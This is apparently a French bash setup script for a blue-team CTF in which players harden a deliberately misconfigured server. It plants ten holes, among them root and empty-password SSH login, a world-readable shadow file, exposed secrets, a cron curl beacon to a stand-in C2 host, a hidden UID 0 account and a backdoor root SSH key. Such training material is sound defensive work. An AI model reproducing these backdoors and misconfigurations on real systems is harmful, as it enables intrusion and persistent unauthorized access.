#!/usr/bin/env bash
# =============================================================================
#  harden_setup.sh  -  Met en place l'environnement VULNERABLE (etat "avant")
#  Execute en tant que root au BUILD de l'image. ADMIN ONLY.
#
#  Cree les 10 mauvaises configurations, de la plus simple a la plus retorse.
# =============================================================================
set -e
echo "[setup] Deploiement de srv-legacy01 (etat vulnerable)..."

# --- Utilisateur joueur : 'analyst' avec sudo (il est l'admin du serveur) -----
if ! id analyst >/dev/null 2>&1; then
  useradd -m -s /bin/bash analyst
  echo 'analyst:analyst' | chpasswd
fi
usermod -aG sudo analyst 2>/dev/null || true
echo 'analyst ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/00-analyst
chmod 440 /etc/sudoers.d/00-analyst

# ====================== FACILE ==============================================
# --- 1 & 2. SSH mal configure -------------------------------------------------
mkdir -p /etc/ssh
cat > /etc/ssh/sshd_config <<'EOF'
# Configuration SSH de srv-legacy01 (heritee, NON durcie)
Port 22
Protocol 2
PermitRootLogin yes
PermitEmptyPasswords yes
PasswordAuthentication yes
X11Forwarding yes
EOF

# --- 3. /etc/shadow lisible par tout le monde ---------------------------------
chmod 644 /etc/shadow

# ====================== MOYEN ===============================================
# --- 4. Secret applicatif lisible par tous ------------------------------------
mkdir -p /opt/app
cat > /opt/app/.env <<'EOF'
APP_ENV=production
DB_HOST=10.20.0.10
DB_USER=nwapp
DB_PASSWORD=Pr0d-S3cr3t-2026!
JWT_SECRET=8f3a9c2e7b1d4056
EOF
chmod 644 /opt/app/.env

# --- 5. Cron de persistance (callback C2) -------------------------------------
mkdir -p /etc/cron.d
cat > /etc/cron.d/sysupdate <<'EOF'
# Tache "mise a jour" (en realite : balise vers un C2)
*/5 * * * * root /bin/bash -c 'curl -s http://cdn-sync-update.net/b >/dev/null 2>&1'
EOF

# --- 6. Telnet active (service en clair) --------------------------------------
cat > /etc/inetd.conf <<'EOF'
# services legacy
telnet  stream  tcp  nowait  root  /usr/sbin/in.telnetd  in.telnetd
ftp     stream  tcp  nowait  root  /usr/sbin/in.ftpd     in.ftpd
EOF

# ====================== DIFFICILE ===========================================
# --- 7. Compte root cache (UID 0) ---------------------------------------------
if ! grep -q '^support:' /etc/passwd; then
  echo 'support:x:0:0:Support Account:/root:/bin/bash' >> /etc/passwd
fi

# --- 8. Binaire SUID root dangereux -------------------------------------------
mkdir -p /usr/local/bin
cat > /usr/local/bin/oldbackup <<'EOF'
#!/bin/bash
# ancien script de sauvegarde laisse SUID root par erreur
tar czf /tmp/backup.tgz /home 2>/dev/null
EOF
chmod 4755 /usr/local/bin/oldbackup   # SUID root

# ====================== EXPERT (aucun indice) ===============================
# --- 9. Repertoire du PATH inscriptible par tous ------------------------------
# /usr/local/bin est dans le PATH : world-writable => n'importe qui peut
# deposer un binaire malveillant qui sera execute a la place d'un legitime.
chmod 0777 /usr/local/bin

# --- 10. Cle SSH backdoor pour root -------------------------------------------
# Un attaquant a laisse sa cle publique dans les authorized_keys de root.
mkdir -p /root/.ssh
chmod 700 /root/.ssh
cat > /root/.ssh/authorized_keys <<'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9k3f7x2Jr0oPqRsTuVwXyZ backdoor ctf-attacker@evil
EOF
chmod 600 /root/.ssh/authorized_keys

# --- Message d'accueil (banniere) ---------------------------------------------
cat > /etc/motd <<'EOF'

  ####################################################################
  #  NORTHWIND Trading Co.  -  srv-legacy01                          #
  #  Blue Team CTF - "Operation IRON GATE"                           #
  #                                                                  #
  #  Ce serveur herite de configurations dangereuses (difficulte     #
  #  croissante). Ta mission : le DURCIR.                            #
  #    - 'audit'        : voir ta progression (fait / a corriger)    #
  #    - 'getflag <N>'  : recuperer le flag d'une tache corrigee     #
  #  Les flags sont valides cote serveur (aucun n'est sur la VM).    #
  #  Les niveaux (expert) ne donnent AUCUN indice.                   #
  ####################################################################

EOF

echo "[setup] Environnement vulnerable pret."
